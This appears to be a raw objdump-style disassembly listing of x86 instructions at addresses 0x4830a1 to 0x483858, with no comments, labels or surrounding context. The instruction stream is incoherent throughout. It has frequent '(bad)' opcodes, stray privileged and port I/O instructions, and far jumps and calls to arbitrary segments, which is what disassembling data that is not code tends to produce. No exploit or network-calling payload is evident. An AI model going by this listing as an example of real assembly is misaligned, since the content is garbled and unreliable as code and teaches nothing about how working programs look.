  4830a1:	inc    esi
  4830a2:	outs   dx,DWORD PTR ds:[esi]
  4830a3:	xchg   ebx,eax
  4830a4:	lods   al,BYTE PTR ds:[esi]
  4830a5:	pop    edx
  4830a6:	ins    BYTE PTR es:[edi],dx
  4830a7:	test   al,0xbb
  4830a9:	sub    BYTE PTR [edi],ah
  4830ab:	mov    al,ds:0xede43c60
  4830b0:	nop
  4830b1:	inc    ebp
  4830b2:	adc    al,0x4f
  4830b4:	cld    
  4830b5:	mov    esp,0x196e0a74
  4830ba:	jo     0x48306c
  4830bc:	dec    ebp
  4830bd:	ret    
  4830be:	jecxz  0x48305b
  4830c0:	dec    ebx
  4830c1:	mov    bl,0x8e
  4830c3:	sahf   
  4830c4:	fwait
  4830c5:	(bad)  
  4830c6:	jns    0x4830bb
  4830c8:	pusha  
  4830c9:	lds    esi,FWORD PTR [eax]
  4830cb:	(bad)  
  4830cc:	into   
  4830cd:	xchg   ecx,eax
  4830ce:	test   BYTE PTR [eax+0x5f],cl
  4830d1:	dec    ebx
  4830d2:	js     0x483090
  4830d4:	ret    
  4830d5:	in     eax,dx
  4830d6:	mov    al,0x0
  4830d8:	push   es
  4830d9:	bound  ebx,QWORD PTR [ecx+0x200ccce7]
  4830df:	xchg   ebp,eax
  4830e0:	mov    ds:0x23d1509f,al
  4830e5:	push   cs
  4830e6:	sbb    ebp,DWORD PTR [edx-0x2c17b31c]
  4830ec:	test   BYTE PTR [ebx-0xa9b2fbf],bl
  4830f2:	push   0x0
  4830f4:	enter  0x3d04,0xae
  4830f8:	mov    ah,0x49
  4830fa:	lds    ebx,FWORD PTR [eax]
  4830fc:	retf   
  4830fd:	add    edi,DWORD PTR ds:0xa22c3248
  483103:	and    DWORD PTR [ebx],0xc31fc6d8
  483109:	mov    BYTE PTR [ecx],ch
  48310b:	ins    DWORD PTR es:[edi],dx
  48310c:	ja     0x483149
  48310e:	stos   BYTE PTR es:[edi],al
  48310f:	adc    BYTE PTR ds:0x13a575ad,0x38
  483116:	add    DWORD PTR [ebp-0x37],edi
  483119:	out    dx,eax
  48311a:	mov    edi,0xe0003f40
  48311f:	add    ebx,DWORD PTR ds:0x68ad9e03
  483125:	rcl    BYTE PTR [eax+0x561f0354],1
  48312b:	(bad)  
  48312c:	adc    al,0xb0
  48312e:	sbb    BYTE PTR [eax],ah
  483130:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  483131:	or     esi,DWORD PTR ds:0x88edee92
  483137:	ds jmp 0x7c09:0xec4050c7
  48313f:	or     eax,0x3858b3c6
  483144:	mov    eax,ds:0xa7315fa4
  483149:	lock mov eax,ds:0x20e78af4
  48314f:	arpl   ax,cx
  483151:	pop    es
  483152:	xor    dh,0x42
  483155:	push   eax
  483156:	sar    BYTE PTR [ecx-0x393e834],cl
  48315c:	dec    ecx
  48315d:	ja     0x483151
  48315f:	xor    ebp,0xf0458bf0
  483165:	aas    
  483166:	jnp    0x4831c1
  483168:	mov    ss,WORD PTR [ecx]
  48316a:	shr    BYTE PTR [edi+0x32],cl
  48316d:	add    ch,al
  48316f:	or     BYTE PTR [edi-0x15],ch
  483172:	jp     0x4831eb
  483174:	or     al,0x4
  483176:	aad    0x60
  483178:	dec    esp
  483179:	inc    ecx
  48317a:	enter  0x35b0,0x4a
  48317e:	or     eax,0x8e7069be
  483183:	cmp    eax,0x87499f66
  483188:	cmp    al,0x64
  48318a:	adc    ah,0x28
  48318d:	or     esi,DWORD PTR [edi-0xc]
  483190:	adc    eax,0x2a8fa4a5
  483195:	test   DWORD PTR [edx+0x5f],0x62814cb4
  48319c:	inc    edx
  48319d:	imul   esi,esp,0x94a1e4a9
  4831a3:	pop    edi
  4831a4:	or     edi,esi
  4831a6:	inc    edx
  4831a7:	pop    es
  4831a8:	mov    al,ds:0xf731c110
  4831ad:	push   ebx
  4831ae:	daa    
  4831af:	inc    eax
  4831b0:	sub    cl,cl
  4831b2:	push   edx
  4831b3:	mov    edx,0x26434aef
  4831b8:	dec    esp
  4831b9:	pop    eax
  4831ba:	dec    edx
  4831bb:	ja     0x4831e6
  4831bd:	push   0xe90077be
  4831c2:	outs   dx,BYTE PTR ds:[esi]
  4831c3:	add    ch,BYTE PTR [ebx]
  4831c5:	pop    esp
  4831c6:	gs icebp 
  4831c8:	sbb    al,BYTE PTR [ebx+0xe]
  4831cb:	inc    esi
  4831cc:	pop    eax
  4831cd:	sub    cl,0xfa
  4831d0:	jge    0x4831a2
  4831d2:	outs   dx,BYTE PTR ds:[esi]
  4831d3:	push   edx
  4831d4:	add    al,0x7c
  4831d6:	mov    ebp,fs
  4831d8:	int3   
  4831d9:	pop    edx
  4831da:	lea    edx,[eax+0x60]
  4831dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4831de:	addr16 jge 0x48322a
  4831e1:	dec    ebp
  4831e2:	loopne 0x48322c
  4831e4:	and    eax,0x8397dc0c
  4831e9:	or     cl,bl
  4831eb:	xchg   edi,eax
  4831ec:	inc    eax
  4831ed:	mov    fs,WORD PTR [eax]
  4831ef:	jge    0x4831e1
  4831f1:	jb     0x483175
  4831f3:	mov    bh,0x4b
  4831f5:	rcl    BYTE PTR [eax+0x5c],cl
  4831f8:	imul   ecx,DWORD PTR [edi],0x6
  4831fb:	mov    ecx,ebp
  4831fd:	adc    DWORD PTR es:[edi+edx*1+0x5c],0x180bef6
  483206:	ss xchg ebp,eax
  483208:	rol    DWORD PTR ds:[ebx+0x3011285a],cl
  48320f:	mov    edx,0x6460435a
  483214:	stos   BYTE PTR es:[edi],al
  483215:	pop    esp
  483216:	dec    ecx
  483217:	sbb    BYTE PTR [esp+ebx*2+0x5f],bl
  48321b:	popa   
  48321c:	loopne 0x4831c5
  48321e:	or     DWORD PTR [ecx+0x3ec06458],edi
  483224:	pushf  
  483225:	ins    BYTE PTR es:[edi],dx
  483226:	jns    0x4a98d42
  48322c:	(bad)  
  48322e:	adc    dh,BYTE PTR [eax]
  483230:	xchg   ebp,eax
  483231:	add    bl,BYTE PTR [eax+0x17f11237]
  483237:	or     DWORD PTR cs:[ecx-0x727fabb5],eax
  48323e:	and    DWORD PTR [ebx+0x54],0xa540683e
  483245:	jg     0x4832c5
  483247:	aaa    
  483248:	mov    ah,0xa2
  48324a:	add    eax,DWORD PTR [edi+eax*4]
  48324d:	cmp    al,BYTE PTR [esp+ebp*8]
  483250:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  483252:	xchg   al,al
  483254:	xor    al,0x27
  483256:	mov    esi,0x56202243
  48325b:	adc    BYTE PTR [edx+0x30dd080a],bh
  483261:	dec    ebp
  483262:	ror    DWORD PTR [eax],cl
  483264:	adc    al,0x14
  483266:	pop    eax
  483267:	or     al,0x94
  483269:	shr    BYTE PTR [esi],0x51
  48326c:	inc    ebx
  48326d:	mov    esi,cr3
  483270:	(bad)  
  483271:	jmp    0x4832ab
  483273:	xor    al,0xb7
  483275:	sub    edx,0x1
  483278:	(bad)  
  483279:	fwait
  48327a:	call   0xe6930c80
  48327f:	add    al,0x5b
  483281:	jmp    0x4832f9
  483283:	cmp    ecx,DWORD PTR [esi+0x8]
  483286:	je     0x4832f9
  483288:	mov    DWORD PTR [esi-0x33],esp
  48328b:	(bad)  
  48328d:	or     BYTE PTR [ebp+0x160876c9],al
  483293:	adc    BYTE PTR [ebx+0x3],dh
  483296:	pushf  
  483297:	(bad)  
  483298:	jge    0x48325d
  48329a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48329b:	xor    dl,dl
  48329d:	fdivr  QWORD PTR [eax]
  48329f:	or     al,0x74
  4832a1:	push   esp
  4832a2:	or     al,0x14
  4832a4:	adc    al,0x68
  4832a6:	add    edx,ecx
  4832a8:	xchg   esi,eax
  4832a9:	pop    edx
  4832aa:	je     0x4832e3
  4832ac:	mov    bl,0x25
  4832ae:	jmp    0x7be6331
  4832b3:	cmp    eax,ecx
  4832b5:	cmp    eax,0x18745e08
  4832ba:	xchg   DWORD PTR [ecx],esp
  4832bc:	xchg   ebx,eax
  4832bd:	mov    ah,0x3c
  4832bf:	or     al,0xc
  4832c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4832c2:	push   eax
  4832c3:	call   0x18c2:0x1ad65a74
  4832ca:	popa   
  4832cb:	pop    esp
  4832cc:	ffree  st(7)
  4832ce:	xchg   BYTE PTR [esi+0x541d6c05],bh
  4832d4:	sbb    BYTE PTR [edi-0x35],bh
  4832d7:	dec    eax
  4832d8:	fadd   QWORD PTR [edi-0xd]
  4832db:	dec    ebp
  4832dc:	in     al,0x51
  4832de:	xchg   ebx,eax
  4832df:	ja     0x483334
  4832e1:	xor    DWORD PTR [ecx+0x5bac3efa],edx
  4832e7:	shr    al,0x71
  4832ea:	dec    ebx
  4832eb:	jbe    0x483357
  4832ed:	retf   
  4832ee:	sbb    BYTE PTR [eax],al
  4832f0:	push   ebp
  4832f1:	rcl    DWORD PTR [edi],cl
  4832f3:	scas   al,BYTE PTR es:[edi]
  4832f4:	adc    BYTE PTR [edi],0x22
  4832f7:	dec    DWORD PTR fs:[esi]
  4832fa:	cmp    ch,bl
  4832fc:	aaa    
  4832fd:	inc    edx
  4832fe:	jl     0x4832ea
  483300:	cmp    BYTE PTR [ebx+0x4a0f84b8],al
  483306:	or     ecx,DWORD PTR gs:[edi-0x50]
  48330a:	pop    esi
  48330b:	inc    ebp
  48330c:	mul    DWORD PTR ds:0x7256a25
  483312:	xchg   esp,eax
  483313:	sbb    DWORD PTR [ebp-0x1c],edx
  483316:	inc    ebx
  483317:	xchg   esp,eax
  483318:	aam    0xb
  48331a:	mov    eax,DWORD PTR gs:[eax+0x25dceec4]
  483321:	cmc    
  483322:	(bad)  
  483323:	in     al,0x4f
  483325:	in     al,dx
  483326:	adc    eax,DWORD PTR [eax]
  483328:	mov    eax,0x460faac
  48332d:	pusha  
  48332e:	pop    es
  48332f:	aaa    
  483330:	push   ecx
  483331:	cwde   
  483332:	ss int 0xa
  483335:	and    ch,dl
  483337:	mov    ds:0xae568be4,al
  48333c:	xor    al,0x80
  48333e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48333f:	pop    es
  483340:	and    BYTE PTR [eax],ch
  483342:	mov    BYTE PTR [ecx],ch
  483344:	daa    
  483345:	retf   0x7706
  483348:	stos   DWORD PTR es:[edi],eax
  483349:	sbb    BYTE PTR [eax],dh
  48334b:	pop    edi
  48334c:	jb     0x483369
  48334e:	sti    
  48334f:	add    edi,DWORD PTR [edi+0x30181680]
  483355:	sbb    BYTE PTR [ecx],dh
  483357:	cmp    BYTE PTR [ebx],dh
  483359:	sub    BYTE PTR [edx+0xc],cl
  48335c:	add    al,0x63
  48335e:	cld    
  48335f:	fs nop
  483361:	ret    0x130b
  483364:	jne    0x4833da
  483366:	inc    ecx
  483367:	add    DWORD PTR [edi+0x34],esi
  48336a:	mov    bh,0x22
  48336c:	call   0xdc77:0x406eccf7
  483373:	shr    DWORD PTR [eax+0x4151ba1d],0xc0
  48337a:	pop    ecx
  48337b:	or     ebx,DWORD PTR [ecx]
  48337d:	loopne 0x4833b8
  48337f:	jbe    0x483349
  483381:	push   0xffffff90
  483383:	addr16 clc 
  483385:	and    DWORD PTR [esi],ecx
  483387:	pushf  
  483388:	mov    edx,0x897c0ba1
  48338d:	sbb    BYTE PTR ds:0xe7909d1b,0xd5
  483394:	outs   dx,DWORD PTR ds:[esi]
  483395:	shl    BYTE PTR [esp+ebx*1],0x8a
  483399:	add    BYTE PTR [ecx-0x20],0xe
  48339d:	imul   ecx,DWORD PTR [ebx],0x24
  4833a0:	cmp    al,BYTE PTR [edx+0x57]
  4833a3:	sti    
  4833a4:	cmp    eax,0x67ef56df
  4833a9:	add    DWORD PTR [ebp+0x20b5118c],edx
  4833af:	add    DWORD PTR [ecx-0x66],edx
  4833b2:	inc    ebp
  4833b3:	lods   eax,DWORD PTR ds:[esi]
  4833b4:	mov    ebp,0x40423b10
  4833b9:	mov    bh,0x9f
  4833bb:	(bad)  
  4833bd:	jno    0x48337f
  4833bf:	push   esp
  4833c0:	enter  0x55d6,0x90
  4833c4:	es dec edx
  4833c6:	mov    eax,ds:0x28192f2d
  4833cb:	in     eax,dx
  4833cc:	mov    ecx,0x18350693
  4833d1:	fs aas 
  4833d3:	xor    BYTE PTR [eax-0x31],bh
  4833d6:	mov    ah,0x7f
  4833d8:	cmp    BYTE PTR [edi],cl
  4833da:	jp     0x4833e1
  4833dc:	mov    DWORD PTR [ecx-0x68ffb54a],edi
  4833e2:	xchg   DWORD PTR [ebp+ebx*2-0x4a],eax
  4833e6:	lock or eax,0xbf80fbc6
  4833ec:	push   ebx
  4833ed:	cmp    bh,cl
  4833ef:	sub    al,0x87
  4833f1:	or     BYTE PTR ds:0xd334d3c2,dl
  4833f7:	jge    0x483419
  4833f9:	adc    BYTE PTR [esp],cl
  4833fc:	pop    ebx
  4833fd:	push   ss
  4833fe:	ret    
  4833ff:	adc    bl,bl
  483401:	(bad)  
  483403:	jne    0x4833f4
  483405:	pop    ebp
  483406:	popf   
  483407:	xor    dh,dl
  483409:	je     0x4833c1
  48340b:	sbb    BYTE PTR [ebx],bh
  48340d:	xchg   BYTE PTR [eax+0x4c],bl
  483410:	jne    0x48346e
  483412:	or     al,0x61
  483414:	mov    cl,0x37
  483416:	cmp    ebp,esi
  483418:	xchg   BYTE PTR [ecx+eax*1+0x7f],dl
  48341c:	xor    BYTE PTR [ebp+0x3baeab36],dl
  483422:	mov    al,BYTE PTR [edi+0x70]
  483425:	cmp    al,BYTE PTR [esi-0x63d6eaa8]
  48342b:	push   eax
  48342c:	jnp    0x48345b
  48342e:	pop    es
  48342f:	fs pusha 
  483431:	daa    
  483432:	xor    al,0xf5
  483434:	fdiv   QWORD PTR [ebx+eiz*4+0x61]
  483438:	mov    bh,BYTE PTR [edi]
  48343a:	enter  0x3f67,0x9
  48343e:	dec    edx
  48343f:	pusha  
  483440:	in     eax,0x1e
  483442:	fimul  DWORD PTR [eax-0xc13468]
  483448:	jmp    0x38d3348f
  48344d:	mov    DWORD PTR [ebx+0x3c],ebx
  483450:	xor    DWORD PTR es:[eax+0x0],esi
  483454:	shl    BYTE PTR [eax+esi*8-0x2],cl
  483458:	mov    DWORD PTR [ebx+esi*2+0x10],edx
  48345c:	(bad)  
  48345d:	push   cs
  48345e:	push   eax
  48345f:	outs   dx,BYTE PTR ds:[esi]
  483460:	loope  0x483455
  483462:	mov    ebx,eax
  483464:	jae    0x4834ce
  483466:	mov    DWORD PTR [esi+0x14],ebx
  483469:	or     eax,0x4807002a
  48346e:	mov    edi,0x43884438
  483473:	popa   
  483474:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  483476:	jmp    0xeb31a495
  48347b:	or     BYTE PTR [ecx+0x74],0x1c
  48347f:	jle    0x4834e1
  483481:	loope  0x483469
  483483:	sbb    al,bl
  483485:	sbb    eax,edi
  483487:	inc    ebx
  483488:	jo     0x4834b2
  48348a:	mov    BYTE PTR [ebx+0x57],0x1
  48348e:	sub    eax,0x6d3cf36
  483493:	pop    eax
  483494:	pop    ecx
  483495:	pop    edx
  483496:	sbb    DWORD PTR [edx-0x2404d5ac],0xffffffef
  48349d:	adc    al,0x60
  48349f:	push   es
  4834a0:	pop    esi
  4834a1:	add    BYTE PTR [esi+0x4c],ah
  4834a4:	jp     0x48349a
  4834a6:	jmp    DWORD PTR [ecx-0x19bb90c0]
  4834ac:	shr    al,1
  4834ae:	add    al,0xce
  4834b0:	jbe    0x4834e4
  4834b2:	ds push eax
  4834b4:	add    ebp,edx
  4834b6:	(bad)  
  4834b7:	retf   0x3c61
  4834ba:	add    BYTE PTR [edx-0x129a702b],ch
  4834c0:	mov    edx,0x77f80f09
  4834c5:	or     eax,DWORD PTR [esi]
  4834c7:	push   0xfffffff8
  4834c9:	les    eax,FWORD PTR [ebx+eiz*8]
  4834cc:	pop    esp
  4834cd:	xchg   DWORD PTR [ecx],esi
  4834cf:	add    bh,BYTE PTR [ebx]
  4834d1:	or     al,BYTE PTR [eax+0x57391d82]
  4834d7:	mov    DWORD PTR [edx],0x39b60693
  4834dd:	mov    eax,0xcac47ba7
  4834e2:	xchg   esp,eax
  4834e3:	js     0x4834ab
  4834e5:	imul   BYTE PTR [edx+0x1d]
  4834e8:	jp     0x48353a
  4834ea:	inc    eax
  4834eb:	int3   
  4834ec:	adc    ah,BYTE PTR [edx+0x2e17edcc]
  4834f2:	add    ch,ch
  4834f4:	sub    ebx,0xb34b5709
  4834fa:	lea    edi,[eax]
  4834fc:	inc    edi
  4834fd:	ins    BYTE PTR es:[edi],dx
  4834fe:	xor    edx,DWORD PTR [edx]
  483500:	sbb    BYTE PTR [eax+ebx*2+0x18],dh
  483504:	cmp    BYTE PTR [ecx+0xe],ch
  483507:	push   0x21cac564
  48350c:	das    
  48350d:	add    DWORD PTR [ecx-0x39],ecx
  483510:	(bad)  
  483511:	scas   eax,DWORD PTR es:[edi]
  483512:	sub    DWORD PTR [ebp+0x586f5750],eax
  483518:	or     al,bl
  48351a:	cmp    DWORD PTR [edx-0x257cf03d],0xe9111095
  483524:	mov    edx,DWORD PTR [eax+0x64]
  483527:	ret    
  483528:	(bad)  
  483529:	xor    BYTE PTR [edx+ebx*1+0x25],dh
  48352d:	popa   
  48352e:	out    dx,al
  48352f:	push   ss
  483530:	jo     0x48353b
  483532:	jae    0x48359c
  483534:	mov    ah,0xa6
  483536:	cmp    DWORD PTR [ecx],0xdb6b883f
  48353c:	add    al,0x14
  48353e:	fdiv   QWORD PTR [esp+ecx*2]
  483541:	push   edi
  483542:	pop    eax
  483543:	mov    eax,ebp
  483545:	ins    BYTE PTR es:[edi],dx
  483546:	xlat   BYTE PTR ds:[ebx]
  483547:	push   ecx
  483548:	or     DWORD PTR [eax-0x59],esp
  48354b:	sbb    DWORD PTR [edi+eax*2+0x3d0af532],ebp
  483552:	xor    eax,ebp
  483554:	cmp    eax,0x23c45af0
  483559:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48355a:	sbb    dl,BYTE PTR [edi+0x3f67c3dc]
  483560:	xchg   ebp,eax
  483561:	push   edi
  483562:	call   0x370044ad
  483567:	pop    es
  483568:	dec    edx
  483569:	and    eax,0xfc0dbf6e
  48356e:	push   0xffffffff
  483570:	aaa    
  483571:	push   esi
  483572:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  483573:	test   DWORD PTR [edi],edx
  483575:	cmc    
  483576:	test   ch,al
  483578:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  483579:	push   es
  48357a:	dec    eax
  48357b:	and    eax,DWORD PTR [edx+0x791538bf]
  483581:	and    BYTE PTR [eax],al
  483583:	out    0x10,eax
  483585:	mov    bh,0xe3
  483587:	jne    0x48359f
  483589:	mov    ch,0xd8
  48358b:	mov    eax,0xd74143a
  483590:	push   cs
  483591:	adc    BYTE PTR [ecx+0x2b],dh
  483594:	cwde   
  483595:	mov    BYTE PTR [ebx],al
  483597:	repnz mov ah,0x5a
  48359a:	or     DWORD PTR [edx+0x1af75460],eax
  4835a0:	dec    esp
  4835a1:	js     0x4835be
  4835a3:	ret    
  4835a4:	mov    ch,BYTE PTR [edi+0x12]
  4835a7:	and    DWORD PTR [ebx+0x50],0xb1b1f2ff
  4835ae:	dec    ecx
  4835af:	xor    BYTE PTR [edx+0x4b],dh
  4835b2:	push   eax
  4835b3:	and    bl,BYTE PTR cs:[edi+0x2e83d07a]
  4835ba:	adc    eax,0x301fd956
  4835bf:	cmp    DWORD PTR [esi],0xffffffac
  4835c2:	(bad)  
  4835c3:	mov    esi,0xde6c3a54
  4835c8:	icebp  
  4835c9:	jns    0x4835d3
  4835cb:	dec    ecx
  4835cc:	push   cs
  4835cd:	mov    DWORD PTR [eax-0x2],ebx
  4835d0:	inc    eax
  4835d1:	or     BYTE PTR [esp+ebp*1],bh
  4835d4:	imul   ebp,DWORD PTR [eax-0x7e],0x60
  4835d8:	push   edx
  4835d9:	add    DWORD PTR [edx-0x3f],ebp
  4835dc:	cmp    cl,BYTE PTR [edx+0x1]
  4835df:	cwde   
  4835e0:	mov    esp,0xe0b5ef68
  4835e5:	pop    es
  4835e6:	sbb    al,0x63
  4835e8:	pop    esp
  4835e9:	mul    DWORD PTR [edx-0x3ca4bc76]
  4835ef:	shr    BYTE PTR [esp+edx*1],0x56
  4835f3:	dec    esp
  4835f4:	add    al,0x3e
  4835f6:	enter  0x7610,0x61
  4835fa:	xchg   edi,esi
  4835fc:	mov    BYTE PTR [eax-0x36],dl
  4835ff:	push   eax
  483600:	xor    BYTE PTR [edx],bh
  483602:	pusha  
  483603:	lock sbb al,0xb1
  483606:	add    ebp,DWORD PTR [eax+ebx*2]
  483609:	pop    edx
  48360b:	cli    
  48360c:	ds inc esi
  48360e:	and    edx,DWORD PTR [eax+edx*1-0x23]
  483612:	sbb    DWORD PTR [edi+edi*8],0xffffff93
  483616:	clc    
  483617:	std    
  483618:	mov    dh,0x2
  48361a:	loope  0x483626
  48361c:	dec    edi
  48361d:	dec    edx
  48361e:	dec    ebx
  48361f:	push   esp
  483620:	or     BYTE PTR [ebx+0x26802c7e],cl
  483626:	inc    ebx
  483627:	test   esp,ecx
  483629:	aaa    
  48362a:	xlat   BYTE PTR ds:[ebx]
  48362b:	mov    dl,0xed
  48362e:	mov    ebp,ss
  483630:	nop
  483631:	in     al,dx
  483632:	push   esp
  483633:	arpl   WORD PTR [edi+esi*8+0x35],dx
  483637:	fdiv   st(1),st
  483639:	jo     0x483693
  48363b:	js     0x483625
  48363d:	or     DWORD PTR ds:0x3df21721,esi
  483643:	in     al,dx
  483644:	pop    ds
  483645:	or     BYTE PTR [ebx],ah
  483647:	mov    ah,BYTE PTR [edi+edx*1]
  48364a:	jb     0x483681
  48364c:	cmp    eax,0xd98d0117
  483651:	rol    BYTE PTR [ebx],cl
  483653:	jg     0x483661
  483655:	add    BYTE PTR [ebx],ch
  483657:	pop    ebx
  483658:	iret   
  483659:	and    al,0x3b
  48365b:	jle    0x4836d9
  48365d:	mov    ecx,0x75d494f0
  483662:	or     ecx,DWORD PTR [ecx+0x23eb18fc]
  483668:	cmp    BYTE PTR [ebp+0x7b],cl
  48366b:	sti    
  48366c:	cmp    al,0x3b
  48366e:	clc    
  48366f:	jne    0x48367a
  483671:	sub    ebp,edi
  483673:	aam    0x87
  483675:	push   ecx
  483676:	imul   eax,esi,0x2002a183
  48367c:	pop    ebx
  48367d:	cmp    BYTE PTR [ebp-0x643a1d00],al
  483683:	clc    
  483684:	xchg   BYTE PTR [edi+0x5b],bl
  483687:	ret    
  483688:	dec    edi
  483689:	push   cs
  48368a:	cmp    eax,0x33719005
  48368f:	out    dx,eax
  483690:	mov    ah,0xdf
  483692:	rol    DWORD PTR [edx],0x3
  483695:	mov    bh,0x75
  483697:	push   0x7f83f60a
  48369c:	lods   al,BYTE PTR ds:[esi]
  48369d:	xor    al,0x17
  48369f:	test   bl,bl
  4836a1:	pop    esp
  4836a2:	(bad)  
  4836a3:	push   es
  4836a4:	je     0x4836fd
  4836a6:	xor    al,0xa
  4836a8:	push   ecx
  4836a9:	dec    eax
  4836aa:	add    eax,0x48ee5f0b
  4836af:	sub    al,0x2
  4836b1:	push   cs
  4836b2:	or     ebp,ebx
  4836b4:	(bad)  
  4836b5:	std    
  4836b6:	out    dx,al
  4836b7:	ret    0x80fd
  4836ba:	jmp    0x2e75:0xc23ac214
  4836c1:	cs pop esp
  4836c3:	sbb    dl,cl
  4836c5:	fs or  dl,dl
  4836c8:	and    esi,DWORD PTR [edi+ebx*1+0x76]
  4836cc:	ror    edx,1
  4836ce:	adc    BYTE PTR [edx-0x52],bh
  4836d1:	inc    edi
  4836d2:	dec    esp
  4836d3:	push   eax
  4836d4:	push   es
  4836d5:	xor    BYTE PTR [eax+0x77488417],0x57
  4836dc:	inc    eax
  4836dd:	cs adc al,0x1
  4836e0:	jecxz  0x48375b
  4836e2:	dec    eax
  4836e3:	(bad)  
  4836e4:	or     eax,ebx
  4836e6:	test   eax,0xd0151748
  4836eb:	xlat   BYTE PTR ds:[ebx]
  4836ec:	add    al,0x31
  4836ee:	inc    edx
  4836ef:	xor    BYTE PTR [ecx-0x4],0x10
  4836f3:	push   es
  4836f4:	add    al,0x5c
  4836f6:	cmp    DWORD PTR [ebx],eax
  4836f8:	adc    ebp,DWORD PTR [eax+eax*1+0x72d4d1df]
  4836ff:	pop    esp
  483700:	inc    eax
  483701:	jbe    0x48373e
  483703:	jnp    0x483749
  483705:	jne    0x483717
  483707:	push   ebx
  483708:	shr    DWORD PTR [esi+0xd],cl
  48370b:	or     eax,0xe087548
  483710:	or     BYTE PTR [esp-0x3e],cl
  483714:	outs   dx,DWORD PTR ds:[esi]
  483715:	pop    ss
  483716:	and    DWORD PTR [eax+0x535753],ecx
  48371c:	test   al,0xe6
  48371e:	cdq    
  48371f:	addr16 inc ebp
  483721:	mov    al,ds:0x89424689
  483726:	mov    DWORD PTR ds:[ecx],esp
  483729:	adc    eax,DWORD PTR [ebp+eax*2-0x7ee708b1]
  483730:	or     eax,0x47cbf9
  483735:	or     al,0x5
  483737:	adc    cl,ch
  483739:	pop    edx
  48373a:	sbb    bh,dl
  48373c:	or     esp,DWORD PTR [ecx]
  48373e:	iret   
  48373f:	cli    
  483740:	push   0x6a
  483742:	xchg   ebp,eax
  483743:	ja     0x4836cc
  483745:	cmp    BYTE PTR [esi+0x62],0x4f
  483749:	xchg   ecx,eax
  48374a:	add    BYTE PTR [ebp+0x2c680160],al
  483750:	inc    esi
  483751:	test   DWORD PTR [edx-0x8402fe3],eax
  483757:	mov    WORD PTR [edx-0x2f5f9ea2],cs
  48375d:	enter  0xc33a,0x38
  483761:	dec    ecx
  483762:	mov    ds:0x86e647bb,al
  483767:	nop
  483768:	sete   BYTE PTR es:[esi+edi*1-0xc7c82b8]
  483771:	(bad)  
  483772:	xchg   edx,eax
  483773:	sbb    ebp,DWORD PTR [ebp+0x646db43]
  483779:	mov    dl,0x46
  48377b:	dec    eax
  48377c:	mov    BYTE PTR cs:[edi],al
  48377f:	push   ds
  483780:	adc    al,0x40
  483782:	out    0x84,al
  483784:	jo     0x4837ad
  483786:	adc    ebp,DWORD PTR [edx]
  483788:	mov    ecx,0xd2a54d03
  48378d:	ret    0x6429
  483790:	or     BYTE PTR [edx],al
  483792:	dec    esp
  483793:	mov    WORD PTR [esi],?
  483795:	in     al,0x6d
  483797:	daa    
  483798:	inc    esp
  483799:	adc    eax,0xb4294c64
  48379e:	rcl    DWORD PTR ds:0xf25e8bf0,0x69
  4837a5:	test   BYTE PTR [edx+0x20],ch
  4837a8:	xor    al,bl
  4837aa:	or     al,0x1c
  4837ac:	cmp    dl,BYTE PTR [eax]
  4837ae:	es cmp edx,0x52
  4837b2:	add    al,0xba
  4837b4:	dec    ebx
  4837b5:	dec    ebx
  4837b6:	and    edx,DWORD PTR [esi]
  4837b8:	(bad)  
  4837b9:	xchg   esp,eax
  4837ba:	jg     0x4837ff
  4837bc:	or     DWORD PTR [ebx],ebx
  4837be:	jo     0x483784
  4837c0:	sub    esp,DWORD PTR [eax]
  4837c2:	and    al,0x46
  4837c4:	xor    BYTE PTR [esp+ebp*2],ah
  4837c7:	scas   eax,DWORD PTR es:[edi]
  4837c8:	inc    edi
  4837c9:	mov    bh,0x16
  4837cb:	pop    ecx
  4837cc:	jmp    0x483784
  4837ce:	fisttp QWORD PTR [ebp-0x72]
  4837d1:	push   ebp
  4837d2:	sbb    BYTE PTR [ebx],bh
  4837d4:	inc    eax
  4837d5:	dec    eax
  4837d6:	das    
  4837d7:	pop    ss
  4837d8:	dec    esp
  4837d9:	xor    esi,DWORD PTR [eax-0x7f]
  4837dc:	outs   dx,DWORD PTR ds:[esi]
  4837dd:	sub    bh,bh
  4837df:	das    
  4837e0:	mov    ah,0x8b
  4837e2:	mov    eax,DWORD PTR [ebx-0x1fb92f14]
  4837e8:	dec    esi
  4837e9:	mov    esi,es
  4837eb:	pop    ebp
  4837ec:	sub    eax,0x80d350f0
  4837f1:	mov    ds,WORD PTR [eax-0x3b2eb804]
  4837f7:	mov    esi,0x44ca4781
  4837fc:	push   esi
  4837fd:	inc    eax
  4837fe:	dec    ebx
  4837ff:	add    cl,BYTE PTR [edi-0x50]
  483802:	stos   DWORD PTR es:[edi],eax
  483803:	ins    DWORD PTR es:[edi],dx
  483804:	outs   dx,DWORD PTR ds:[esi]
  483805:	dec    esi
  483806:	push   edx
  483807:	xchg   ecx,eax
  483808:	dec    ebx
  483809:	add    al,0x97
  48380b:	dec    esp
  48380c:	pushf  
  48380d:	or     DWORD PTR [esi],esi
  48380f:	push   edx
  483810:	inc    edi
  483811:	or     al,al
  483813:	pop    ecx
  483814:	and    ebp,DWORD PTR [edi+0x6eececff]
  48381a:	iret   
  48381b:	lods   al,BYTE PTR ds:[esi]
  48381c:	mov    esi,0x983b49c8
  483821:	mov    al,ds:0x801a72fd
  483826:	and    eax,0x67039ae0
  48382b:	pop    ss
  48382c:	sub    BYTE PTR [ebx+0x4e],al
  48382f:	sbb    ch,cl
  483831:	in     al,dx
  483832:	push   cs
  483833:	and    al,0x10
  483835:	cmp    al,0x47
  483837:	jns    0x4838a3
  483839:	sbb    DWORD PTR [edi],ecx
  48383b:	mov    al,ds:0xbb3eac1c
  483840:	daa    
  483841:	add    al,0x4c
  483843:	push   es
  483844:	or     DWORD PTR [ebx+0x6029aa09],0x0
  48384b:	push   esp
  48384c:	sub    al,0x53
  48384e:	pop    ebp
  48384f:	in     al,0x63
  483851:	dec    esp
  483852:	arpl   WORD PTR ds:0x36116543,ax
  483858:	sub    DWORD PTR [edx-0x2bbfb0fd],esi
